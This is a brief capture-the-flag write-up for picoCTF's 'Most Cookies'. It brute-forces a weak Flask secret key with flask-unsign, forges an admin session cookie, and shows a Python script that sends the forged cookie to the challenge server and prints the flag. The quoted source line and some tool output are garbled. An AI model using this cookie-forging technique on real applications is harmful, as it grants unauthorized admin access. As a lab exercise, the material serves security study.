# Most_Cookies
###### tags: `web` `ctf` `security` `vuln` `ペネトレ` `cookie` `jwt` `python` `flask`

i received a certain file.
i found suspicious line.
```python=
app.secret_key = random.choice(cookie_names) for i in cookie_names:
```

this means that one of cookie_names is secret_key.
so length of cookie_names is only 28.

hence we can allow brute-force.

let's go ahead.

```
$ flask-unsign --unsign -w ./wordlist.txt --cookie < cookie.txt
[*] Session decodes to: {'very_auth': 'blank'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'fortune'
```

```
$ ./flask_session_cookie_manager3.py encode -s 'fortune' -t '{"very_auth":"admin"}'
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.ZBBjOg.M6F3uM1ohKprwQcwY-zyA8A28fI
```

```python=
# solve.py
import requests
import jwt
import re
encoded_jwt = "eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.ZBBjOg.M6F3uM1ohKprwQcwY-zyA8A28fI"
#urlencode the jwt
s = requests.Session() 
cookie = {'session': encoded_jwt}
res = s.get('http://mercury.picoctf.net:65344', cookies=cookie)
res = s.get('http://mercury.picoctf.net:65344/display', cookies=cookie)
pettern = "picoCTF{.*}"
te = res.text
for i in te.split():
    m = re.search(pettern, i)
    if m:
        print(m.group(0))
```

```
$ python solve.py         
picoCTF{pwn_4ll_th3_cook1E5_25bdb6f6}
```